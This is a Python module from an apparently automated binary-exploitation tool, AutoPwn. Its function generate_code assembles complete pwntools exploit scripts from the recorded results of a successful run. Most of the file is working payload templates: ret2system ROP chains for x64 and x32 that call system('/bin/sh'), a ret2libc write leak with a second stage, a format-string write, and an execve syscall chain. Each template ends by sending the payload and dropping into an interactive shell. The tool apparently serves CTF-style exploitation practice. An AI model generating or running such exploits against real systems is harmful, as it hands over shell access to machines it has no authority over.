"""AutoPwn report layer — Exploit code generator.

Moved from ``autopwn/_legacy.py`` v3.1 in P3.3 (see ``rebuild.md`` §4.4 +
§6.4).  Reads from the typed :class:`ExploitInfo` dataclass (P3.1)
instead of the loose ``exploit_info`` dict.

Design
======
* **Pure function**: takes ``info`` and ``out_dir``, returns the
  generated Python source as a ``str``.  Caller is responsible for
  embedding it in the docx (P3.2 ``generate_docx``) or writing it
  to a file (P3.4 ``record_success`` will pick this up).
* **``out_dir`` parameter is currently unused** but kept in the
  signature for forward-compat: P3.4 / P3.5 may use it to write a
  ``{target}_wp.py`` file alongside the docx.  Adding it now means
  P3.3 callers don't need to change in P3.4.
* **No more global state**: the legacy ``global exploit_info``
  declaration is gone.  All 20 ``exploit_info['x']`` reads become
  ``info.x``.
* **String template** (f-string) is preserved verbatim from legacy
  to keep the output byte-identical — the §2.6 2-log comparison
  treats the generated code as a black box.

Field mapping (legacy dict → ExploitInfo)
-----------------------------------------
========================================== ==============================
``exploit_info['x']``                       ``info.x``
========================================== ==============================
``'target_binary'``                         ``info.target_binary`` (basename
                                           extracted via ``Path().name`` in
                                           this fn, ``./`` prefix stripped)
``'exploit_type'``                          ``info.exploit_type``
``'architecture'``                          ``info.architecture``
``'vulnerability_type'``                    ``info.vulnerability_type``
``'padding'``                               ``info.padding``
``'addresses'``                             ``info.addresses``
``'payload'`` (repr() format)               ``info.payload`` (re-formatted
                                           via ``repr()`` like legacy)
``'addresses'['buf_addr']`` /              ``info.addresses.get(...)``
``'addresses'['system_addr']``             (with default fallback like legacy)
``.get('offset', 'OFFSET_VALUE')``         handled inline (no field on
                                           ExploitInfo; uses 'offset' from
                                           addresses dict if present, else
                                           'OFFSET_VALUE')
========================================== ==============================

Adoption roadmap (see ``rebuild.md`` §4.4)
------------------------------------------
* P3.1 (✅) — :class:`ExploitInfo` dataclass.
* P3.2 (✅) — :func:`report.docx.generate_docx` reads from ExploitInfo.
* P3.3 (this PR) — move ``generate_exploitation_code`` here as
  :func:`generate_code(info, out_dir) -> str`; switch
  ``autopwn.report.docx`` import to this module.
* P3.4 — refactor ``handle_exploitation_success`` to construct an
  ``ExploitInfo`` directly and call ``report.record_success`` (no
  more dict bridge); this module's ``out_dir`` may be used to write
  a ``{target}_wp.py`` artifact.
"""
from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING

from autopwn.report.model import ExploitInfo

if TYPE_CHECKING:
    pass  # forward-compat: type-only imports go here


def generate_code(info: ExploitInfo, out_dir: Path) -> str:
    """Generate the full Python exploitation script for a successful run.

    Parameters
    ----------
    info : ExploitInfo
        Typed result of a successful exploitation.  All 6 required
        fields (``exploit_type``, ``payload``, ``padding``,
        ``addresses``, ``vulnerability_type``, ``architecture``) and
        the optional ``target_binary`` are read.
    out_dir : Path
        Reserved for forward-compat (P3.4 / P3.5 may write a
        ``{target}_wp.py`` artifact here).  Not used in P3.3.

    Returns
    -------
    str
        Complete Python source code as a string, ready to be
        embedded in a docx (P3.2) or written to a ``.py`` file
        (P3.4+).

    The function template is **byte-identical** to the legacy
    ``generate_exploitation_code`` (v3.1).  Only the data source
    changes (dict → dataclass); no f-string text is modified.
    """
    # Extract target binary name (basename, strip leading "./")
    target_name = Path(info.target_binary).name
    if target_name.startswith("./"):
        target_name = target_name[2:]

    # Base template for exploitation code
    base_code = f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PWN Exploitation Script
# Target: {info.target_binary}
# Exploit Type: {info.exploit_type}
# Architecture: {info.architecture}
# Vulnerability: {info.vulnerability_type}

from pwn import *

# Target configuration
target = '{target_name}'
context.arch = '{info.architecture}'
context.log_level = 'debug'

# Connect to target
io = process(target)
# For remote: io = remote('host', port)

"""

    # Add addresses information as variables
    if info.addresses:
        base_code += "# Key addresses\n"
        for addr_type, addr_value in info.addresses.items():
            if isinstance(addr_value, int):
                base_code += f"{addr_type} = 0x{addr_value:x}\n"
            elif isinstance(addr_value, str) and addr_value.startswith("0x"):
                base_code += f"{addr_type} = {addr_value}\n"
            else:
                try:
                    base_code += f"{addr_type} = 0x{int(str(addr_value)):x}\n"
                except Exception:
                    base_code += f"{addr_type} = {repr(addr_value)}\n"
        base_code += "\n"

    # Add payload construction based on exploit type
    exploit_type = info.exploit_type.lower()

    if "ret2system" in exploit_type:
        if "x64" in exploit_type:
            base_code += f"""# Construct payload for ret2system x64
padding = b'A' * {info.padding}
payload = padding
payload += p64(pop_rdi_addr)  # pop rdi; ret
payload += p64(bin_sh_addr)   # "/bin/sh" address
payload += p64(ret_addr)      # ret gadget for stack alignment
payload += p64(system_addr)   # system() address
"""
        else:
            base_code += f"""# Construct payload for ret2system x32
padding = b'A' * {info.padding}
payload = padding
payload += p32(system_addr)   # system() address
payload += p32(0x0)           # return address (dummy)
payload += p32(bin_sh_addr)   # "/bin/sh" address
"""

    elif "ret2libc" in exploit_type and "write" in exploit_type:
        if "x64" in exploit_type:
            base_code += f"""# Construct payload for ret2libc write x64
padding = b'A' * {info.padding}
payload = padding
payload += p64(pop_rdi_addr)  # pop rdi; ret
payload += p64(1)             # stdout fd
payload += p64(pop_rsi_addr)  # pop rsi; ret  
payload += p64(write_got)     # write@got address
payload += p64(ret_addr)      # ret gadget
payload += p64(write_plt)     # write@plt
payload += p64(main_addr)     # return to main for second stage
"""
        else:
            base_code += f"""# Construct payload for ret2libc write x32
padding = b'A' * {info.padding}
payload = padding
payload += p32(write_plt)     # write@plt
payload += p32(main_addr)     # return to main
payload += p32(1)             # stdout fd
payload += p32(write_got)     # write@got address
payload += p32(4)             # bytes to write
"""

    elif "format string" in exploit_type:
        base_code += f"""# Format string exploitation
offset = {info.addresses.get('offset', 'OFFSET_VALUE')}
buf_addr = {info.addresses.get('buf_addr', 'BUF_ADDRESS')}
system_addr = {info.addresses.get('system_addr', 'SYSTEM_ADDRESS')}

# Construct format string payload
payload = fmtstr_payload(offset, {{buf_addr: system_addr}})
"""

    elif "execve syscall" in exploit_type:
        base_code += f"""# Construct payload for execve syscall
padding = b'A' * {info.padding}
payload = padding
payload += p32(pop_eax_addr)  # pop eax; ret
payload += p32(0xb)           # execve syscall number
payload += p32(pop_ebx_addr)  # pop ebx; ret
payload += p32(bin_sh_addr)   # "/bin/sh" address
payload += p32(pop_ecx_addr)  # pop ecx; ret
payload += p32(0x0)           # argv = NULL
payload += p32(pop_edx_addr)  # pop edx; ret
payload += p32(0x0)           # envp = NULL
payload += p32(int_0x80)      # int 0x80
"""

    else:
        # Generic payload construction
        base_code += f"""# Construct payload
padding = b'A' * {info.padding}
payload = padding
payload += {repr(info.payload) if isinstance(info.payload, bytes) else repr(str(info.payload))}
"""

    # Add exploitation execution
    base_code += f"""
# Send payload
io.sendline(payload)

# Get shell
io.interactive()
"""

    # ``out_dir`` is intentionally unused in P3.3 (forward-compat for
    # P3.4 / P3.5 to optionally write a ``{target}_wp.py`` artifact).
    del out_dir  # silence unused-arg lint without breaking the signature

    return base_code


__all__ = ["generate_code"]
